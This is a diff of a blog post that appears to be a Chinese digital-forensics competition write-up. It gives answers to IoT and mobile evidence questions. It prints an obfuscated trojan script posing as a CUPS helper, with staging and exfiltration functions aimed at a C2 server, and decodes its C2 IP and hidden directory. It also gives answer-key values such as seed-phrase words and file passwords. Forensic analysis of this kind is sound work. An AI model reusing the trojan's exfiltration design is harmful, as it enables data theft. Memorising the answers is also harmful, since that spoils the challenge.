-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">log_message</span>(message): 
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Appends a timestamped message to the log file.&#34;&#34;&#34;</span> 
-</span></span><span style="display:flex;"><span>    now <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>now()<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#34;%Y-%m-</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %H:%M:%S&#34;</span>) 
-</span></span><span style="display:flex;"><span>    full_message <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[</span><span style="color:#e6db74">{</span>now<span style="color:#e6db74">}</span><span style="color:#e6db74">] </span><span style="color:#e6db74">{</span>message<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(LOG_FILE, <span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#66d9ef">as</span> f: 
-</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(full_message) 
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scan_and_stage</span>(): 
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;(Simulated) Scans the spool directory and copies sensitive files to the staging  
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">area.&#34;&#34;&#34;</span> 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span> 
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exfiltrate_data</span>(): 
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;(Simulated) &#39;Uploads&#39; files from the staging directory to the C2 server.&#34;&#34;&#34;</span> 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(STAGING_DIR): 
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> 
-</span></span><span style="display:flex;"><span>    staged_files <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(STAGING_DIR) 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> staged_files: 
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>: 
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># The system log entry shows this connection attempt. </span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># This part of the script provides the &#34;ground truth&#34; for that log. </span>
-</span></span><span style="display:flex;"><span>        sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM) 
-</span></span><span style="display:flex;"><span>        sock<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">5</span>) 
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># sock.connect((C2_SERVER, C2_PORT))  </span>
-</span></span><span style="display:flex;"><span>         
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> filename <span style="color:#f92672">in</span> staged_files: 
-</span></span><span style="display:flex;"><span>            log_message(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SUCCESS: Uploaded </span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74"> to </span><span style="color:#e6db74">{</span>C2_SERVER<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) 
-</span></span><span style="display:flex;"><span>         
-</span></span><span style="display:flex;"><span>        sock<span style="color:#f92672">.</span>close() 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e: 
-</span></span><span style="display:flex;"><span>        log_message(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;ERROR: Could not connect to C2 server: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(): 
-</span></span><span style="display:flex;"><span>    scan_and_stage() 
-</span></span><span style="display:flex;"><span>    exfiltrate_data() 
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>: 
-</span></span><span style="display:flex;"><span>    main()
-</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/SZB2025CS/21.png"></p>
-<p>答案：2177</p>
-<p>70.分析物联网检材，系统中存在一个非标定时任务，这个任务每隔多少分钟执行？（答案格式：1）</p>
-<p>火眼的定时任务只分析了 /etc/crontab 文件里的内容，/etc/cron.d 目录下还有其他的定时任务，healthcheck：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/20.png"></p>
-<p>答案：10</p>
-<p>71.分析物联网检材，木马程序会窃取文档暂存在隐藏目录，这个目录的绝对路径？（/root/root/）</p>
-<p>先逆置再解base64：GJTJlh2YhNmLGJTJw1GdGJTJ</p>
-<p>答案：/tmp/.cache/</p>
-<p>72.分析物联网检材，木马程序将数据上传到的服务器的IP地址是多少？（答案格式：1.1.1.1）</p>
-<p>先逆置再解base64：zUTMugDMx4SO5EjL1gTM</p>
-<p>答案：185.199.108.153</p>
-<p>73.根据木马程序，它监视的关键字是什么？（答案格式：按照实际情况填写）</p>
-<p>先逆置再解base64：=UmcpZmbvdWYyREMyUCdjVmavJHU</p>
-<p>答案：Project Dragonfire</p>
-<h2 id="移动终端取证分析">移动终端取证分析<a hidden class="anchor" aria-hidden="true" href="#移动终端取证分析">#</a></h2>
-<p>火眼识别不了rar，先解压再把data压缩成zip</p>
-<p>74.分析检材中微信ID:wxid_f4s0jmpvrc522对应的手机号后四位为（答案格式：1111）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/1.png"></p>
-<p>答案：8390</p>
-<p>75.分析检材中“华为应用市场”第一次安装日期为（使用双位数格式，答案格式：01月01日）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/2.png"></p>
-<p>答案：09月24日</p>
-<p>76.找出检材中钱包APP，请列出该APP中ETH地址后六位是（字母全大写，答案格式：AAAAAA）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/3.png"></p>
-<p>答案：3FE61F</p>
-<p>77.分析出检材中包含“南昌西站”的图片，计算该图片的MD5后六位？（字母全大写，答案格式：AAAAAA）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/4.png"></p>
-<p>答案：85A51D</p>
-<p>78.手机相册中有张“imtoken助记词1.PNG”图片被破坏，请修复该图片，列出该图片中第三个单词。（答案格式：按照实际情况填写）</p>
-<p>宽高爆破：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ python 1.py -f 1.PNG                    
-</span></span><span style="display:flex;"><span>宽高被改了, 是否CRC爆破宽高? <span style="color:#f92672">(</span>Y/n<span style="color:#f92672">)</span>:Y
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>CRC32: 0xf2e8fe18
-</span></span><span style="display:flex;"><span>宽度: 1809, hex: 0x711
-</span></span><span style="display:flex;"><span>高度: 222, hex: 0xde
-</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/SZB2025CS/7.png"></p>
-<p>答案：boost</p>
-<p>79.找出一张PNG图片，该图片上显示“助记词2”，请列出该图片上显示的第二个单词。（答案格式：按照实际情况填写）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/5.png"></p>
-<p>答案：delay</p>
-<p>80.找出检材中显示“助记词3”的文档，列出该文档中记录的第三个助记词单词。（答案格式：按照实际情况填写）</p>
-<p>全局搜索 助记词3 ，可以找到备忘录文件，直接打开看不到，藏在文件尾：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/23.png"></p>
-<p>答案：quarter</p>
-<p>81.分析出该组助记词正常顺序中最后一个单词（已知助记词1.助记词2.助记词3中的单词顺序有被调整）。（答案格式：按照实际情况填写）</p>
-<p>82.分析出邮箱中收件人QQ号为“850563586”的姓名（答案格式：按照实际情况填写）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/6.png"></p>
-<p>答案：刘佳雨</p>
-<p>83.得知机主通过某个应用给HHshAL发送了一个文档，该应用的数据包名是什么？（答案格式：com.test）</p>
-<p>答案：dingtong.saichuang</p>
-<p>84.接上题，该应用聊天记录数据库的打开密码是什么？（答案格式：按照实际情况填写）</p>
-<p>数据库 dingtong.db 被加密过</p>
-<p>85.接上题，机主发送的这个加密文档，打开密码是什么？（答案格式：按照实际情况填写）</p>
-<p>86.厉明的身份证地址登记的门牌号是多少？？（答案格式：1）</p>
-<p>身份证_f33.mxt是个zip，需要密码：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/10.png"></p>
-<p>密码：bwX2ZEfE9</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/12.png"></p>
-<p>答案：722</p>
-<p>87.分析出“important1.xlsx”文件中体现的“金达欣”银行卡后六位？（答案格式：111111）</p>
-<p>important1.xlsx需要密码</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/10.png"></p>
-<p>密码：3;s=]-</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/11.png"></p>
-<p>答案：935629</p>
-<p>88.接上题，保存“important1.xlsx”打开密码数据的应用，该应用的启动密码是什么？（答案格式：按照实际情况填写）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/9.png"></p>
-<p>答案：3357</p>
-
-
-  </div>
-
-  <footer class="post-footer">
-    <ul class="post-tags">
-    </ul>
-  </footer>
-</article>
-    </main>
-    
-<footer class="footer">
-        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 
-
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
-
-<script>
-    let menu = document.getElementById('menu')
-    if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
-
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-
-</script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
-
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            document.body.classList.add('dark');
-            localStorage.setItem("pref-theme", 'dark');
-        }
-    })
-
-</script>
-</body>
-
-</html>
+</code></pre><p>答案：/var/spool/cups</p><p>68.同一天，打印两份文件的用户是谁？(答案格式：root)</p><p>/var/log/cups/page_log：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/18.png></p><p>答案：alice</p><p>69.分析物联网检材，木马运行后，自身产生的进程ID是多少？（答案格式：1）</p><p>木马 /usr/local/bin/cups-helper：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python3 </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*- </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># A helper script to manage CUPS spooling and perform health checks. </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Do not modify unless you are an authorized technician. </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># KVJEYIHHXSLOPIEBEAWT4ICCMFZWKNRUEDT3ZFXHUCASALJ6EDS23F7HVSTOJOFS4WHY32F5VQ====== </span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os 
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> shutil 
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket 
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> datetime 
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re 
+</span></span><span style=display:flex><span><span style=color:#75715e># --- Configuration --- </span>
+</span></span><span style=display:flex><span><span style=color:#75715e># C2 server for uploading diagnostic data </span>
+</span></span><span style=display:flex><span>C2_SERVER <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;zUTMugDMx4SO5EjL1gTM&#34;</span> 
+</span></span><span style=display:flex><span>C2_PORT <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;zQDN&#34;</span> 
+</span></span><span style=display:flex><span><span style=color:#75715e># Spool directory to monitor </span>
+</span></span><span style=display:flex><span>SPOOL_DIR <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;GJTJzBXdjZkMlw2bvB3cGJTJyFmdGJTJ&#34;</span> 
+</span></span><span style=display:flex><span><span style=color:#75715e># Define staging directory for processing before exfiltration </span>
+</span></span><span style=display:flex><span>STAGING_DIR <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;GJTJlh2YhNmLGJTJw1GdGJTJ&#34;</span> 
+</span></span><span style=display:flex><span><span style=color:#75715e># Log file for upload activities </span>
+</span></span><span style=display:flex><span>LOG_FILE <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;==wZvxmLkF2bsBXdGJTJlJXYoNnRyUCbhN2bs5iRyUCdv9mcGJTJ&#34;</span> 
+</span></span><span style=display:flex><span><span style=color:#75715e># Keyword to identify sensitive documents for &#34;special handling&#34; </span>
+</span></span><span style=display:flex><span>WATCHED_KEYWORD <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;=UmcpZmbvdWYyREMyUCdjVmavJHU&#34;</span> 
+</span></span><span style=display:flex><span><span style=color:#75715e># --- End Configuration --- </span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>log_message</span>(message): 
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Appends a timestamped message to the log file.&#34;&#34;&#34;</span> 
+</span></span><span style=display:flex><span>    now <span style=color:#f92672>=</span> datetime<span style=color:#f92672>.</span>datetime<span style=color:#f92672>.</span>now()<span style=color:#f92672>.</span>strftime(<span style=color:#e6db74>&#34;%Y-%m-</span><span style=color:#e6db74>%d</span><span style=color:#e6db74> %H:%M:%S&#34;</span>) 
+</span></span><span style=display:flex><span>    full_message <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[</span><span style=color:#e6db74>{</span>now<span style=color:#e6db74>}</span><span style=color:#e6db74>] </span><span style=color:#e6db74>{</span>message<span style=color:#e6db74>}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span> 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(LOG_FILE, <span style=color:#e6db74>&#39;a&#39;</span>) <span style=color:#66d9ef>as</span> f: 
+</span></span><span style=display:flex><span>        f<span style=color:#f92672>.</span>write(full_message) 
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>scan_and_stage</span>(): 
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;(Simulated) Scans the spool directory and copies sensitive files to the staging  
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>area.&#34;&#34;&#34;</span> 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>pass</span> 
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exfiltrate_data</span>(): 
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;(Simulated) &#39;Uploads&#39; files from the staging directory to the C2 server.&#34;&#34;&#34;</span> 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(STAGING_DIR): 
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> 
+</span></span><span style=display:flex><span>    staged_files <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>listdir(STAGING_DIR) 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> staged_files: 
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>: 
+</span></span><span style=display:flex><span>        <span style=color:#75715e># The system log entry shows this connection attempt. </span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># This part of the script provides the &#34;ground truth&#34; for that log. </span>
+</span></span><span style=display:flex><span>        sock <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM) 
+</span></span><span style=display:flex><span>        sock<span style=color:#f92672>.</span>settimeout(<span style=color:#ae81ff>5</span>) 
+</span></span><span style=display:flex><span>        <span style=color:#75715e># sock.connect((C2_SERVER, C2_PORT))  </span>
+</span></span><span style=display:flex><span>         
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> filename <span style=color:#f92672>in</span> staged_files: 
+</span></span><span style=display:flex><span>            log_message(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;SUCCESS: Uploaded </span><span style=color:#e6db74>{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74> to </span><span style=color:#e6db74>{</span>C2_SERVER<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>) 
+</span></span><span style=display:flex><span>         
+</span></span><span style=display:flex><span>        sock<span style=color:#f92672>.</span>close() 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e: 
+</span></span><span style=display:flex><span>        log_message(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;ERROR: Could not connect to C2 server: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>) 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>(): 
+</span></span><span style=display:flex><span>    scan_and_stage() 
+</span></span><span style=display:flex><span>    exfiltrate_data() 
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>: 
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div><p><img alt=alt loading=lazy src=/images/SZB2025CS/21.png></p><p>答案：2177</p><p>70.分析物联网检材，系统中存在一个非标定时任务，这个任务每隔多少分钟执行？（答案格式：1）</p><p>火眼的定时任务只分析了 /etc/crontab 文件里的内容，/etc/cron.d 目录下还有其他的定时任务，healthcheck：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/20.png></p><p>答案：10</p><p>71.分析物联网检材，木马程序会窃取文档暂存在隐藏目录，这个目录的绝对路径？（/root/root/）</p><p>先逆置再解base64：GJTJlh2YhNmLGJTJw1GdGJTJ</p><p>答案：/tmp/.cache/</p><p>72.分析物联网检材，木马程序将数据上传到的服务器的IP地址是多少？（答案格式：1.1.1.1）</p><p>先逆置再解base64：zUTMugDMx4SO5EjL1gTM</p><p>答案：185.199.108.153</p><p>73.根据木马程序，它监视的关键字是什么？（答案格式：按照实际情况填写）</p><p>先逆置再解base64：=UmcpZmbvdWYyREMyUCdjVmavJHU</p><p>答案：Project Dragonfire</p><h2 id=移动终端取证分析>移动终端取证分析<a hidden class=anchor aria-hidden=true href=#移动终端取证分析>#</a></h2><p>火眼识别不了rar，先解压再把data压缩成zip</p><p>74.分析检材中微信ID:wxid_f4s0jmpvrc522对应的手机号后四位为（答案格式：1111）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/1.png></p><p>答案：8390</p><p>75.分析检材中“华为应用市场”第一次安装日期为（使用双位数格式，答案格式：01月01日）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/2.png></p><p>答案：09月24日</p><p>76.找出检材中钱包APP，请列出该APP中ETH地址后六位是（字母全大写，答案格式：AAAAAA）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/3.png></p><p>答案：3FE61F</p><p>77.分析出检材中包含“南昌西站”的图片，计算该图片的MD5后六位？（字母全大写，答案格式：AAAAAA）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/4.png></p><p>答案：85A51D</p><p>78.手机相册中有张“imtoken助记词1.PNG”图片被破坏，请修复该图片，列出该图片中第三个单词。（答案格式：按照实际情况填写）</p><p>宽高爆破：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ python 1.py -f 1.PNG                    
+</span></span><span style=display:flex><span>宽高被改了, 是否CRC爆破宽高? <span style=color:#f92672>(</span>Y/n<span style=color:#f92672>)</span>:Y
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>CRC32: 0xf2e8fe18
+</span></span><span style=display:flex><span>宽度: 1809, hex: 0x711
+</span></span><span style=display:flex><span>高度: 222, hex: 0xde
+</span></span></code></pre></div><p><img alt=alt loading=lazy src=/images/SZB2025CS/7.png></p><p>答案：boost</p><p>79.找出一张PNG图片，该图片上显示“助记词2”，请列出该图片上显示的第二个单词。（答案格式：按照实际情况填写）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/5.png></p><p>答案：delay</p><p>80.找出检材中显示“助记词3”的文档，列出该文档中记录的第三个助记词单词。（答案格式：按照实际情况填写）</p><p>全局搜索 助记词3 ，可以找到备忘录文件，直接打开看不到，藏在文件尾：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/23.png></p><p>答案：quarter</p><p>81.分析出该组助记词正常顺序中最后一个单词（已知助记词1.助记词2.助记词3中的单词顺序有被调整）。（答案格式：按照实际情况填写）</p><p>82.分析出邮箱中收件人QQ号为“850563586”的姓名（答案格式：按照实际情况填写）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/6.png></p><p>答案：刘佳雨</p><p>83.得知机主通过某个应用给HHshAL发送了一个文档，该应用的数据包名是什么？（答案格式：com.test）</p><p>答案：dingtong.saichuang</p><p>84.接上题，该应用聊天记录数据库的打开密码是什么？（答案格式：按照实际情况填写）</p><p>数据库 dingtong.db 被加密过</p><p>85.接上题，机主发送的这个加密文档，打开密码是什么？（答案格式：按照实际情况填写）</p><p>86.厉明的身份证地址登记的门牌号是多少？？（答案格式：1）</p><p>身份证_f33.mxt是个zip，需要密码：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/10.png></p><p>密码：bwX2ZEfE9</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/12.png></p><p>答案：722</p><p>87.分析出“important1.xlsx”文件中体现的“金达欣”银行卡后六位？（答案格式：111111）</p><p>important1.xlsx需要密码</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/10.png></p><p>密码：3;s=]-</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/11.png></p><p>答案：935629</p><p>88.接上题，保存“important1.xlsx”打开密码数据的应用，该应用的启动密码是什么？（答案格式：按照实际情况填写）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/9.png></p><p>答案：3357</p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://blog.w8nn9z.top/>w8nn9z Blog</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
